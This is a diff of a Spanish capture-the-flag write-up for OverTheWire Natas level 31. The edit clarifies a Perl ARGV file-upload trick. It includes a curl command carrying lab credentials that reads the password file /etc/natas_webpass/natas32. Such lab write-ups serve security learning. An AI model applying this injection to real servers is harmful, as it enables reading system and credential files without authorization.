@@ -9,7 +9,7 @@ En resumen, AFR:
 
 ![2025-03-21-153213_1366x768_scrot](https://github.com/user-attachments/assets/c2a47dbd-b87d-480b-b6d9-3baf828aa987)
 
-Solo tenemos que pasar "ARGV" como otro valor con el mismo identificador que el archivo a subir
+Solo tenemos que pasar "ARGV" como `el primer valor` con el mismo identificador que el archivo a subir
 ```
 echo "1;2;3;4" > file.csv
 curl -u natas31:m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y -F file=ARGV -F file=@/home/kalcast/Laboratorio/file.csv submit=Upload http://natas31.natas.labs.overthewire.org/index.pl?/etc/natas_webpass/natas32
